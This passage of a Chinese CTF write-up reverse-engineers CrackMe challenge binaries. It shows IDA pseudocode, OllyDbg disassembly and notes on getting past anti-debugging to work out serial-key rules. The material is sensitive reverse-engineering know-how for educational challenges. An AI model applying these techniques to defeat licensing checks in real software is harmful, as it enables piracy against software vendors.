class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">int __stdcall sub_434EF0(HWND hDlg, int a2, int a3, int a4)</div><div class="line">&#123;</div><div class="line">  int v4; // ST0C_4@17</div><div class="line">  CHAR *v5; // esi@17</div><div class="line">  int v6; // eax@17</div><div class="line">  int v8; // [sp+0h] [bp-1A4Ch]@18</div><div class="line">  int v9; // [sp+4h] [bp-1A48h]@18</div><div class="line">  int v10; // [sp+8h] [bp-1A44h]@18</div><div class="line">  int v11; // [sp+Ch] [bp-1A40h]@1</div><div class="line">  int i; // [sp+1C4h] [bp-1888h]@14</div><div class="line">  char v13[1032]; // [sp+1D0h] [bp-187Ch]@16</div><div class="line">  char v14[40]; // [sp+5D8h] [bp-1474h]@14</div><div class="line">  int v15; // [sp+600h] [bp-144Ch]@14</div><div class="line">  char v16; // [sp+60Ch] [bp-1440h]@14</div><div class="line">  char v17; // [sp+60Dh] [bp-143Fh]@14</div><div class="line">  char v18; // [sp+A14h] [bp-1038h]@14</div><div class="line">  char v19; // [sp+A15h] [bp-1037h]@14</div><div class="line">  char v20; // [sp+E1Ch] [bp-C30h]@14</div><div class="line">  char v21; // [sp+E1Dh] [bp-C2Fh]@14</div><div class="line">  CHAR String; // [sp+1224h] [bp-828h]@14</div><div class="line">  char v23; // [sp+1225h] [bp-827h]@14</div><div class="line">  int v24; // [sp+162Ch] [bp-420h]@14</div><div class="line">  char v25; // [sp+1638h] [bp-414h]@1</div><div class="line">  char v26; // [sp+1639h] [bp-413h]@1</div><div class="line">  int v27; // [sp+1A40h] [bp-Ch]@1</div><div class="line">  unsigned int v28; // [sp+1A48h] [bp-4h]@1</div><div class="line">  int savedregs; // [sp+1A4Ch] [bp+0h]@1</div><div class="line"></div><div class="line">  memset(&amp;v11, 0xCCu, 0x1A40u);</div><div class="line">  v28 = (unsigned int)&amp;savedregs ^ dword_49B344;</div><div class="line">  v27 = 0;</div><div class="line">  v25 = 0;</div><div class="line">  sub_42D5E6(&amp;v26, 0, 1023);</div><div class="line">  v11 = a2;</div><div class="line">  if ( a2 == 16 )</div><div class="line">    ExitProcess(0);</div><div class="line">  if ( v11 == 272 )</div><div class="line">  &#123;</div><div class="line">    v27 = sub_42D4F1();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42E428();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42D825();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    sub_42D14F(hDlg, 1);</div><div class="line">  &#125;</div><div class="line">  else if ( v11 == 273 )</div><div class="line">  &#123;</div><div class="line">    v11 = (unsigned __int16)a3;</div><div class="line">    if ( (unsigned __int16)a3 == 1002 )</div><div class="line">    &#123;</div><div class="line">      String = 0;</div><div class="line">      sub_42D5E6(&amp;v23, 0, 1023);</div><div class="line">      v20 = 0;</div><div class="line">      sub_42D5E6(&amp;v21, 0, 1023);</div><div class="line">      GetDlgItemTextA(hDlg, 1001, &amp;String, 1025);</div><div class="line">      v24 = sub_42DE51();</div><div class="line">      v18 = 0;</div><div class="line">      sub_42D5E6(&amp;v19, 0, 1023);</div><div class="line">      sub_42D267(&amp;String, 1024, &amp;v20);</div><div class="line">      v16 = 0;</div><div class="line">      sub_42D5E6(&amp;v17, 0, 1023);</div><div class="line">      sub_42D267(&amp;v20, 1024, &amp;v18);</div><div class="line">      sub_42D96A(&amp;v18, &amp;v16, 1024);</div><div class="line">      v15 = 3;</div><div class="line">      sub_42DA78(&amp;v18, 3, v14);</div><div class="line">      for ( i = 0; i &lt; 32; ++i )</div><div class="line">        sub_42DF05(&amp;v13[2 * i], &quot;%02x&quot;, v14[i]);</div><div class="line">      v4 = sub_42D794(v13);</div><div class="line">      v5 = &amp;String + sub_42D794(&amp;String);</div><div class="line">      v6 = sub_42D794(v13);</div><div class="line">      if ( !sub_42DB27(v13, &amp;v5[-v6], v4) )</div><div class="line">      &#123;</div><div class="line">        sub_42D0B4(v8, v9, v10);</div><div class="line">        if ( (unsigned __int8)sub_42D9AB(&amp;unk_49B000, &amp;v16) == 1 )</div><div class="line">        &#123;</div><div class="line">          MessageBoxA(0, &quot;ok&quot;, &quot;CrackMe&quot;, 0);</div><div class="line">          sub_42DE51();</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  sub_42D65E(&amp;savedregs, &amp;dword_435250);</div><div class="line">  sub_42D1E5();</div><div class="line">  return sub_42DE51();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>哇，还是经验太少，这里许多函数看不懂。</p><p>再用OD打开，发现程序有随机化，好烦，f9…出现对话框，按道理这时候可以在读取字符的API下断点，这里是GetDlgItemTextA。然而，我在当前模块中没有找到，后来发现个插件-设置API断点，总算断下来啦。接下来分析算法啦(这是我的能力还是太弱了)。</p><p>借助大神们的wp<br>IDA反汇编关键函数<br><img src="http://ww4.sinaimg.cn/large/006rgqhqly1fl19dym9r5j30xg0jvn5i.jpg" alt=""></p><p>这个直接明文:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqly1fl19irbza0j30xq0cjtef.jpg" alt=""><br>我自己尝试，然而，我来到这个函数，程序执行后就崩溃了<br><img src="http://ww3.sinaimg.cn/large/006rgqhqly1fl19m8qbthj31180ho41f.jpg" alt=""><br>继续分析。</p><p>猜测作者意图<br>1、获取输入 ipt<br>2、两次 base64 解码得到 buf<br>3、自定义解码得到 cmd<br>4、判断 sm3(buf[:3) == ipt[-64:]<br>5、cmd 能在迷宫走到终点</p><h1 id="4、Re4"><a href="#4、Re4" class="headerlink" title="4、Re4"></a>4、Re4</h1><h2 id="1、题目-2"><a href="#1、题目-2" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析-1"><a href="#3、分析-1" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、OD附加，过反调试<br>先运行exe程序，再打开od附加exe进程，再调用GetWindowTextW的API时候下断点，点击运行，exe程序输入sn,此时会断在od中的GetWindowTextW的断点（还在api系统区）<br><img src="" alt=""><br>往下走来到程序区<br><img src="" alt=""><br>往下走,主要细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">01151CB0    55              push    ebp</div><div class="line">01151CB1    8BEC            mov     ebp, esp</div><div class="line">01151CB3    81EC D0000000   sub     esp, 0xD0</div><div class="line">01151CB9    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">01151CBE    33C5            xor     eax, ebp</div><div class="line">01151CC0    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151CC3    57              push    edi</div><div class="line">01151CC4    8BF9            mov     edi, ecx</div><div class="line">01151CC6    85FF            test    edi, edi</div><div class="line">01151CC8    0F84 61010000   je      01151E2F</div><div class="line">01151CCE    85D2            test    edx, edx</div><div class="line">01151CD0    0F85 81000000   jnz     01151D57</div><div class="line">01151CD6    E8 25FFFFFF     call    01151C00       ;判断注册码是否包含&apos;b&apos;</div><div class="line">01151CDB    85C0            test    eax, eax</div><div class="line">01151CDD    74 54           je      short 01151D33</div><div class="line">01151CDF    68 C8000000     push    0xC8</div><div class="line">01151CE4    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CEA    6A 00           push    0x0</div><div class="line">01151CEC    50              push    eax</div><div class="line">01151CED    E8 DE1C0000     call    &lt;memset&gt;</div><div class="line">01151CF2    83C4 0C         add     esp, 0xC</div><div class="line">01151CF5    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CFB    6A 64           push    0x64</div><div class="line">01151CFD    50              push    eax</div><div class="line">01151CFE    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D01    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D07    6A 70           push    0x70</div><div class="line">01151D09    8D95 34FFFFFF   lea     edx, dword ptr [ebp-0xCC]</div><div class="line">01151D0F    E8 3C0D0000     call    01152A50    ; 判断注册码里是否包含&apos;p&apos;</div><div class="line">01151D14    85C0            test    eax, eax</div><div class="line">01151D16    74 1B           je      short 01151D33</div><div class="line">01151D18    BA 01000000     mov     edx, 0x1</div><div class="line">01151D1D    8BCF            mov     ecx, edi</div><div class="line">01151D1F    E8 8CFFFFFF     call    01151CB0</div><div class="line">01151D24    5F              pop     edi</div><div class="line">01151D25    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D28    33CD            xor     ecx, ebp</div><div class="line">01151D2A    E8 960F0000     call    01152CC5</div><div class="line">01151D2F    8BE5            mov     esp, ebp</div><div class="line">01151D31    5D              pop     ebp</div><div class="line">01151D32    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D57    56              push    esi</div><div class="line">01151D58    E8 812B0000     call    011548DE</div><div class="line">01151D5D    68 C8000000     push    0xC8</div><div class="line">01151D62    8985 30FFFFFF   mov     dword ptr [ebp-0xD0], eax</div><div class="line">01151D68    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D6E    6A 00           push    0x0</div><div class="line">01151D70    50              push    eax</div><div class="line">01151D71    E8 5A1C0000     call    &lt;memset&gt;</div><div class="line">01151D76    83C4 0C         add     esp, 0xC</div><div class="line">01151D79    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D7F    68 C8000000     push    0xC8</div><div class="line">01151D84    50              push    eax</div><div class="line">01151D85    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D88    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D8E    33F6            xor     esi, esi</div><div class="line">01151D90    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D96    66:39B5 34FFFFF&gt;cmp     word ptr [ebp-0xCC], si</div><div class="line">01151D9D    74 0B           je      short 01151DAA</div><div class="line">01151D9F    90              nop</div><div class="line">01151DA0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151DA3    46              inc     esi</div><div class="line">01151DA4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151DA8  ^ 75 F6           jnz     short 01151DA0</div><div class="line">01151DAA    33C9            xor     ecx, ecx</div><div class="line">01151DAC    8D46 01         lea     eax, dword ptr [esi+0x1]</div><div class="line">01151DAF    BA 02000000     mov     edx, 0x2</div><div class="line">01151DB4    F7E2            mul     edx</div><div class="line">01151DB6    53              push    ebx</div><div class="line">01151DB7    0F90C1          seto    cl</div><div class="line">01151DBA    F7D9            neg     ecx</div><div class="line">01151DBC    0BC8            or      ecx, eax</div><div class="line">01151DBE    51              push    ecx</div><div class="line">01151DBF    E8 120F0000     call    01152CD6</div><div class="line">01151DC4    83C4 04         add     esp, 0x4</div><div class="line">01151DC7    8BD8            mov     ebx, eax</div><div class="line">01151DC9    E8 102B0000     call    011548DE</div><div class="line">01151DCE    2B85 30FFFFFF   sub     eax, dword ptr [ebp-0xD0]</div><div class="line">01151DD4    83F8 02         cmp     eax, 0x2</div><div class="line">01151DD7    7F 65           jg      short 01151E3E</div><div class="line">01151DD9    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151DDF    50              push    eax</div><div class="line">01151DE0    53              push    ebx</div><div class="line">01151DE1    E8 8A0A0000     call    01152870</div><div class="line">01151DE6    83FE 07         cmp     esi, 0x7           ;注册码是否为7位</div><div class="line">01151DE9    73 0B           jnb     short 01151DF6</div><div class="line">01151DEB    6A 00           push    0x0</div><div class="line">01151DED    6A 00           push    0x0</div><div class="line">01151DEF    68 0E040000     push    0x40E</div><div class="line">01151DF4    EB 0B           jmp     short 01151E01</div><div class="line">01151DF6    76 2C           jbe     short 01151E24</div><div class="line">01151DF8    6A 00           push    0x0</div><div class="line">01151DFA    6A 00           push    0x0</div><div class="line">01151DFC    68 0D040000     push    0x40D</div><div class="line">01151E01    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151E04    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151E0A    53              push    ebx</div><div class="line">01151E0B    E8 CF0E0000     call    01152CDF</div><div class="line">01151E10    83C4 04         add     esp, 0x4</div><div class="line">01151E13    5B              pop     ebx</div><div class="line">01151E14    5E              pop     esi</div><div class="line">01151E15    5F              pop     edi</div><div class="line">01151E16    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E19    33CD            xor     ecx, ebp</div><div class="line">01151E1B    E8 A50E0000     call    01152CC5</div><div class="line">01151E20    8BE5            mov     esp, ebp</div><div class="line">01151E22    5D              pop     ebp</div><div class="line">01151E23    C3              retn</div><div class="line">01151E24    8BD3            mov     edx, ebx</div><div class="line">01151E26    8BCF            mov     ecx, edi</div><div class="line">01151E28    E8 33FCFFFF     call    01151A60        ;这里进入最后的判断</div><div class="line">01151E2D    5B              pop     ebx</div><div class="line">01151E2E    5E              pop     esi</div><div class="line">01151E2F    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E32    33CD            xor     ecx, ebp</div><div class="line">01151E34    5F              pop     edi</div><div class="line">01151E35    E8 8B0E0000     call    01152CC5</div><div class="line">01151E3A    8BE5            mov     esp, ebp</div><div class="line">01151E3C    5D              pop     ebp</div><div class="line">01151E3D    C3              retn</div><div class="line">01151E3E    6A 00           push    0x0</div><div class="line">01151E40    E8 6C2D0000     call    01154BB1</div></pre></td></tr></table></figure></p><p>以上代码得出注册码必须为7位并且包含字符’b’,’p’<br>再看最后的判断call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line">01151870    55              push    ebp</div><div class="line">01151871    8BEC            mov     ebp, esp</div><div class="line">01151873    83EC 54         sub     esp, 0x54</div><div class="line">01151876    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">0115187B    33C5            xor     eax, ebp</div><div class="line">0115187D    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151880    53              push    ebx</div><div class="line">01151881    56              push    esi</div><div class="line">01151882    57              push    edi</div><div class="line">01151883    6A 36           push    0x36</div><div class="line">01151885    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">01151888    8BD9            mov     ebx, ecx</div><div class="line">0115188A    6A 00           push    0x0</div><div class="line">0115188C    50              push    eax</div><div class="line">0115188D    8BFA            mov     edi, edx</div><div class="line">0115188F    895D AC         mov     dword ptr [ebp-0x54], ebx</div><div class="line">01151892    E8 39210000     call    &lt;memset&gt;</div><div class="line">01151897    83C4 0C         add     esp, 0xC</div><div class="line">0115189A    8D4D E8         lea     ecx, dword ptr [ebp-0x18]</div><div class="line">0115189D    B8 30000000     mov     eax, 0x30</div><div class="line">011518A2    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518A5    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518A8    40              inc     eax</div><div class="line">011518A9    83F8 39         cmp     eax, 0x39</div><div class="line">011518AC  ^ 7E F4           jle     short 011518A2                   ; 0-9</div><div class="line">011518AE    B8 61000000     mov     eax, 0x61</div><div class="line">011518B3    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011518B6    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518B9    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518BC    40              inc     eax</div><div class="line">011518BD    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518C0  ^ 7E F4           jle     short 011518B6                   ; a-z</div><div class="line">011518C2    33D2            xor     edx, edx</div><div class="line">011518C4    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">011518C7    66:3955 B0      cmp     word ptr [ebp-0x50], dx</div><div class="line">011518CB    74 0D           je      short 011518DA</div><div class="line">011518CD    0F1F            ???                                      ; 未知命令</div><div class="line">011518CF    008D 40024266   add     byte ptr [ebp+0x66420240], cl</div><div class="line">011518D5    8338 00         cmp     dword ptr [eax], 0x0</div><div class="line">011518D8  ^ 75 F6           jnz     short 011518D0</div><div class="line">011518DA    33C9            xor     ecx, ecx</div><div class="line">011518DC    85D2            test    edx, edx</div><div class="line">011518DE    74 1C           je      short 011518FC</div><div class="line">011518E0    0FB7444D B0     movzx   eax, word ptr [ebp+ecx*2-0x50]</div><div class="line">011518E5    83F8 61         cmp     eax, 0x61</div><div class="line">011518E8    72 0D           jb      short 011518F7</div><div class="line">011518EA    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518ED    77 08           ja      short 011518F7</div><div class="line">011518EF    83C0 E0         add     eax, -0x20</div><div class="line">011518F2    66:89444D B0    mov     word ptr [ebp+ecx*2-0x50], ax</div><div class="line">011518F7    41              inc     ecx</div><div class="line">011518F8    3BCA            cmp     ecx, edx</div><div class="line">011518FA  ^ 72 E4           jb      short 011518E0</div><div class="line">011518FC    33C9            xor     ecx, ecx</div><div class="line">011518FE    8BC7            mov     eax, edi</div><div class="line">01151900    85FF            test    edi, edi</div><div class="line">01151902    74 76           je      short 0115197A</div><div class="line">01151904    66:390F         cmp     word ptr [edi], cx</div><div class="line">01151907    74 11           je      short 0115191A</div><div class="line">01151909    0F1F            ???                                      ; 未知命令</div><div class="line">0115190B    8000 00         add     byte ptr [eax], 0x0</div><div class="line">0115190E    0000            add     byte ptr [eax], al</div><div class="line">01151910    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151913    41              inc     ecx</div><div class="line">01151914    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151918  ^ 75 F6           jnz     short 01151910</div><div class="line">0115191A    33C0            xor     eax, eax</div><div class="line">0115191C    85C9            test    ecx, ecx</div><div class="line">0115191E    74 22           je      short 01151942</div><div class="line">01151920    83F8 02         cmp     eax, 0x2</div><div class="line">01151923    73 07           jnb     short 0115192C</div><div class="line">01151925    66:833447 0F    xor     word ptr [edi+eax*2], 0xF</div><div class="line">0115192A    EB 11           jmp     short 0115193D</div><div class="line">0115192C    83F8 04         cmp     eax, 0x4</div><div class="line">0115192F    73 07           jnb     short 01151938</div><div class="line">01151931    66:833447 50    xor     word ptr [edi+eax*2], 0x50</div><div class="line">01151936    EB 05           jmp     short 0115193D</div><div class="line">01151938    66:833447 42    xor     word ptr [edi+eax*2], 0x42</div><div class="line">0115193D    40              inc     eax</div><div class="line">0115193E    3BC1            cmp     eax, ecx</div><div class="line">01151940  ^ 72 DE           jb      short 01151920</div><div class="line">01151942    33D2            xor     edx, edx</div><div class="line">01151944    8BC7            mov     eax, edi</div><div class="line">01151946    66:3917         cmp     word ptr [edi], dx</div><div class="line">01151949    74 0F           je      short 0115195A</div><div class="line">0115194B    0F1F            ???                                      ; 未知命令</div><div class="line">0115194D    44              inc     esp</div><div class="line">0115194E    0000            add     byte ptr [eax], al</div><div class="line">01151950    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151953    42              inc     edx</div><div class="line">01151954    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151958  ^ 75 F6           jnz     short 01151950</div><div class="line">0115195A    33C9            xor     ecx, ecx</div><div class="line">0115195C    85D2            test    edx, edx</div><div class="line">0115195E    74 1A           je      short 0115197A</div><div class="line">01151960    0FB7044F        movzx   eax, word ptr [edi+ecx*2]</div><div class="line">01151964    83F8 61         cmp     eax, 0x61</div><div class="line">01151967    72 0C           jb      short 01151975</div><div class="line">01151969    83F8 7A         cmp     eax, 0x7A</div><div class="line">0115196C    77 07           ja      short 01151975</div><div class="line">0115196E    83C0 E0         add     eax, -0x20</div><div class="line">01151971    66:89044F       mov     word ptr [edi+ecx*2], ax</div><div class="line">01151975    41              inc     ecx</div><div class="line">01151976    3BCA            cmp     ecx, edx</div><div class="line">01151978  ^ 72 E6           jb      short 01151960</div><div class="line">0115197A    33F6            xor     esi, esi</div><div class="line">0115197C    0F57C0          xorps   xmm0, xmm0</div><div class="line">0115197F    66:0FD6         ???                                      ; 未知命令</div><div class="line">01151982    45              inc     ebp</div><div class="line">01151983    F0:66:8975 F8   lock mov word ptr [ebp-0x8], si          ; 不允许锁定前缀</div><div class="line">01151988    66:3937         cmp     word ptr [edi], si</div><div class="line">0115198B    74 48           je      short 011519D5</div><div class="line">0115198D    66:8B4D B0      mov     cx, word ptr [ebp-0x50]</div><div class="line">01151991    8D5D F0         lea     ebx, dword ptr [ebp-0x10]</div><div class="line">01151994    8BC7            mov     eax, edi</div><div class="line">01151996    66:85C9         test    cx, cx</div><div class="line">01151999    74 